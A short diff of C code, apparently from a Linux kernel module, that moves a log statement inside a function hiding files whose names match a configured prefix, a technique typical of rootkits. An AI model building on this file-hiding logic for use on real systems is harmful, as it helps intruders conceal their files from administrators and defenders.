@@ -101,8 +101,8 @@ void log_error(const char *message) {
  * If this method returns true, the file in question should be hidden.
  */
 static bool should_hide_file(const char *name) {
-    printk(KERN_INFO "Determining if should hide: %s\n", name);
     if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
+	    printk(KERN_INFO "Hiding: %s\n", name);
         return true;
     }
     return false;
